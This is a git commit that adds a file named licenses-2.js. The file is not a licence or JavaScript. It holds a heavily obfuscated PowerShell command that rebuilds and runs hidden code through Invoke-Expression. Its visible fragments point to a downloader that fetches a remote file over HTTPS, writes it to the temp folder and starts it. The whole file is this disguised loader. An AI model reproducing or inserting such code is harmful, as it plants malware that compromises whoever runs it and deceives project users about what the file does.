c86e799b36bd3d7258376e5aae58f9faa796109d
Azkic50 <Azkilohj55@gmail.com>
2025-03-30 21:11:17 -0400

    Create licenses-2.js

---
+++ licenses-2.js
@@ -0,0 +1,22 @@
+ .( $PsHome[4]+$PshOmE[30]+'x')( " $(sEt 'oFs'  '') " +( [sTrIng][REgEx]::mAtChES(")''nIoj-]52,62,4[CEPsmoc:vNe$ (. | )93]raHc[]GnIRTs[,'0yz'(ECALpeR.)'|',)97]raHc[+47]raHc[+711]raHc[((ECALpeR.)43]raHc[]GnIRTs[,'3xo'(ECALpeR.)'xEi OJu )63]rAHC[,0yz35O0yz  ecaLpeRc- 93]rAHC[,0yzxlD0yzecaLpeRc- 421]rAHC[,0yz'+'GcT0yz ecaLpeRc-))0yzxlD    '+'x0yz,0yz(xlD+xlD = )xlD+xlDsH8asH8({@]0yz,0yz)xlDxlDNiOj-xlDxxlD+]3,10yz,0yzxlD+xlDf  
+;xlD+xlD)
+})sH8xlD+xlDsm.GxlD+x'+'lDIsxlD+xlDHxlD+0yz,0yz6q irU- )sx0yz,0yzxlD{YwW(.( fi    xlD+xlD xlD+xlD 
+;}EuRd'+'6Ut{76q = }DAOlNxlD+0yz,0yz+xlDH80yz,0yzxlDUEd6UMd6xlD+xlDUOsxl'+'D+xlD{xlD+x'+'lD76q xlD+xlD 
+
+xlD0yz,0yzC[,xlDsH8x0yz,0yz'+'UeLxlD+xlDiF{76qxl'+'D+xlD )sH8P-tsesHxlD+xlD8,xlD+xlDsH8hxlD+xlDsxlD+xlDH8xlD+x'+'lD,sxlD0'+'yz,0yzx'+'l0yz,0yz 
+;xlD+0yz,0yzsH8,sH8tsxlD+xlDH8,xlD+xlDsH'+'xlD+xlD8xlD+xlDixlD+'+'xlDsm.'+'IsH8,sH8VRxlD+xlD/etxlD'+'+xlDis0yz,0yz+xlD'+'0yz,0yzl0yz,0yzD1{}3xlD+xlD{Yx'+'lD+xlDwxlD+xlDW'+'(&xlD+xlD  xlD+0yz,0yzxlDsH8,sxlD+xlDH8-susH8,sxlD+xlDH8thsH8,sxlD+xlDH8LC'+'QsH8,sxlD+xlDH8psH8,sH8/:ssH8 f- xlD'+'+xlDYwxlD+xlDW}xlD+xl0yz,0yzD+xlD
+xlD+xlD }xlD0yz,0yzxlD+xlDbexlD+0yz,0yz+xlDf{7'+'6q     xlD+xlD 
+{ '+'yxlD+xlDrt   xlD+xlD 
+{ )}AtxlD+xlD'+'addxlD+xlD6UemxlD+x'+'lDOd6Us{xlD+xlD76xlD+'+'xlDq nxlD+xlDi '+'}i{'+'70yz,0yzHC[,xlDYwWxl'+'D  ecaLPErc- 63]RAHC[,xlD76qxlD  EcAlPER-  29]RAHC[,xlD6z4xlD EcAlPER0yz,0yzwW( '+'= )sH0yz,0yzlD76qxlD+xlD   '+'  0yz,0yz GcT)93]RAH0yz,0yz8x0yz,0y'+'z76q        
+{xlD+0yz,'+'0yz6Unwod'+'6Ud{76q( fixlD+xlD xlD+xl0yz,0yztax'+'lD+xlDcxlD+xlD  xlD+xlD  
+} x'+'lD0yz,0yzDH8ssecorP-sH8,sxlD+xlDH8trasH8 fxlD+xlD-xlD+xlD xlD+xlDYxlD+xlDwW}1{}0xlD+xlD{}2xlD+xlD{xlD+xlD'+'YwW(& x0yz,0yz+xlD   '+'
+;}hxlD+xlDTdxl'+'D+xlD6U'+'ApeLxlD+xlD0yz,'+'0yz((0yz,0yzlD+xlD x'+'lD+x'+'lD
+}   xlD+xlD   xlD+xlD
+ ;}htAxlD+xlDd6UpELxlD+x0yz,0yzxlD+xlDd6xlD+0yz,0yz6q( xlD+xlDhxlD+xlDcaero0yz,0yztxl'+'D+xlDcexl'+'D+xlDjbOmot0yz,0yzqYwWxl0yz,0yz{}'+'1{}0xlD+xlD1xlD+0yz,0yzxlDwoxlD+xl'+'Dd6xlD+xlDU'+'xlD+x'+'lDDxlD+xlD{xlD0yz'+',0yzD+xlD}2{}x'+'lD+xlD1xlD'+'+xlD1xlD+x'+'lD{}8{}6{}5{}4{}xlD+xlD2x'+'lD+xlD'+'1{}7{}00yz,0yz YwW}1{}'+'xlD+x'+'lD2{}0{Y0yz,'+'0yzlD+xlDH8esHxlD+xlD8,sxlD+xlDH8xlD+xlDR-xlD+xlDekxlD+xlDovnIsH8,sHxlD+xlD8doxlD+x0yz,0yzlD+xlDbsH8( ;)xlD+xlDsHxlD+'+'xlD8tasH8,sH8V'+'xlD+xlDWxlD0yz,0yzHxlD+xlD8,sH8sesHxlD+xlD8,sH8MtsxlD+xlD'+'H8xlD+xlD fxlD+xlD-YwW}xlD+xlD2xlD+xlD{}4xlD+xlD{xlD+xlD}0{}xlD+xl0yz,0yz+xlD      
+xlD+xlD0yz,0yzlDE0yz,0yzsuCxlD+xlDSP[  
+(@ = }AtaD0yz,'+'0yzDd6UwOd6UDxlD+xlD{0yz,0yzD'+'+xlD    
+xl0yz,0'+'yzlDhxlD+xlDts0yz,0yzlD EcAlPER-69]RA'+'HC[,)001]RAHC[+45]RAHC[+58]RAHC[(EcAlPER- 43]RA0yz,0yzlDif{76q el'+'iFxlD+xlDtuO- YwWA'+'YwxlD+xlDWxlD+xlD.}ixlD+xlD{70yz'+',0yz x0yz,0yzlD+0y'+'z,0yzd6UiF'+'xlD+xlD{76q )xlD+xlDsH8tSsxlD+xlDH8,sxlD+xl0yz,0yzD+xlD'+' = }'+'HTdxlD+xlD6UxlD+xlDaP'+'x'+'lD+x0yz,0yzlD+xlDd0yz,'+'0yzxlD{}xlD+xlD3{YwxlD+xlDW0yz,0yzxlD      
+xlD+xlD{xlD+xlD xlD+xlD)}da0yz,0yz[)EcnErE'+'fErPesobrEV35O]gNiRTS[( ( &0yz,0yzxlD+xlDH8LCQVWxlD+xlDVRxlD+xlDsH8f-0yz,'+'0yzxlDsH8xlD+xlD,xlD+xlDsH8n/sH8,sxlD+xlDH8w.sutrxlD+0yz,0yzxlD+xlDoxl'+'D+xlDlx0yz,0yzD9{xl0yz,0yzlD+xlD'+'NxlD+'+'xl0yz,0yz+x0'+'yz'+',0yzxlD8,sxlD+xlDHxlD+xlD8isxlD+xlDH8xlD+xlD,s0'+'yz,0yzD+xlD{ hcxlD+xlD0yz,0yzxlDsH8,sH8ipxlD+0yz,0yz;}eSLxlD'+'+xlDAd6Uf{76xlD+xlDq = }DaOlx0yz,0yzTxlD+xlDsH8xlD+xlD,sxlD+xlDH8tasHxlD+xlD8 xlD+xlDf-YwW}xlD+xlD2{xlD+xlD}0{'+'}30yz,0yz{}1xlD+0yz,0yzLId6UxlD0yz,0yzD )xl'+'D+xlD}'+'hxlD+xlDtxlD+'+'xlDA'+'d6Upd60yz,0yzxlDYxlD+xlDwxlD+xlDW)xlD+xlDb.i76q(76q6xlD+xlDz4PMExlD+xl'+'DT:vne7xlD+xlD60yz,0yz- )xlD  xlD+xlD
+
+xlD+xlD'+'}  
+xlD+xlD}xl'+'0yz,0yzD xlD+xlD xlD'+'+xlD  0yzf-3xo}37{}71{}25{}76{'+'}6'+'2{}55{}1{}82{}9{}84{}64{}22{}74{}'+'32{}57{}44{}52{}17{}53'+'{'+'}72{}33{}06{}81{}41{}02{}94{}0{}42{}16{}85{}23{}7{}21'+'{}92{}05{}56'+'{}3{}'+'66{}96{}6{}5{}07{}83{}11{}35{}46{}2{}04'+'{}12{}13{}4{}65{}24{}27{}01{}61{}63{}45{}15{}43{}26{}36{}75{}51{}8{}95{}31{}73{}93{}'+'91{}47{}1'+'4{}03{}34{}86{}54{3xo((('( " ,'.','rIGHtTOlEft')| ForeAch { $_ })+" $(SEt-itEm  'vaRiabLE:Ofs'  ' ' ) ")
